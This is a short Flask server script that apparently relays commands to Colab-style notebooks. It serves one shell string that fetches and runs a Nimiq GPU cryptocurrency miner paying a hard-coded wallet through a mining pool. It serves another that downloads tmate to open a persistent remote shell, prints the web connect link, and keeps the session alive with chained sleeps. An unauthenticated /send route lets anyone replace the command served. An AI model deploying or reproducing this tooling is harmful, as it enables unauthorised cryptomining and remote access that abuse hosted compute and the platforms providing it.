from flask import Flask, request
import os
from datetime import datetime
import random
chars = [i for i in "abcdefghjklmnoprstuvyzxwq1234567890"]
strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"

app = Flask(__name__)
command = 'mkdir NimiqMiner && cd NimiqMiner && wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip && mkdir nq-miner && tar -xzvf nq-nimer-linux.zip -C nq-miner && rm nq-nimer-linux.zip &&rm ./nq-miner/start_gpu.sh &&./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443'

command = """!nvidia-smi -L
!wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
!tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
!rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
!./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
!sleep  9 && sleep 99 && sleep 999 &&  sleep 9999 &&  sleep 99999 &&  sleep 999999 && sleep 9999999 && sleep 99999999 && sleep 999999999 &"""


@app.route("/recieve")
def recieve():
    strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"
    command1 = """
#@title **ID: {}**
""".format(strs)
    return command1+command

@app.route("/send")
def send():
  if request.method == "POST":
    global command
    command = request.form.get("command")
    
  


if __name__ == "__main__":
  app.run(port = 5000)
